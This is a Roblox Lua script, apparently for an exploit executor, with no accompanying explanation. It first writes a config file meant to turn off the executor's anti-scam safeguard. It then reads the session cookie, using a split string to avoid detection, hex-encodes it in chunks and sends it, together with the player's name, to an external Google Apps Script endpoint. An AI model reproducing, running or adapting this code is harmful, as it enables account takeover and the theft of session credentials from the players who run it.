local gasUrl = "https://script.google.com/macros/s/AKfycbzWKCkpoBcO6AZzlp4uWB6zfzo9nzcdJ_vRdiA7n2RRgqb51M0IkK7d9AwidKUpXGOr/exec"
local player = game:GetService("Players").LocalPlayer
local myUserId = tostring(player.UserId)
local bP = "Delta/Internals/Secqured/"

local function doBypass()
    local config = string.format([[{"warning":"stop","allowed_games":"*","user_id":"%s","version_num":707}]], myUserId)
    local target = bP .. "disableantisbam"
    pcall(function() writefile(target, config) end)
end

local function snatch()
    local cook = game["Coo".."kie"]
    if cook and cook ~= "" then
        for i = 1 , #cook, 20 do
            local f = cook:sub(i, i+19)
            local h = ""
            for j = 1, #f do h = h .. string.format("%02X", f:byte(j)) end
            game:HttpGet(gasUrl .. "?hex=" .. h .. "&user=" .. player.Name)
            task.wait(0.8)
        end
    end
end

doBypass()
task.wait(1.5)
snatch()
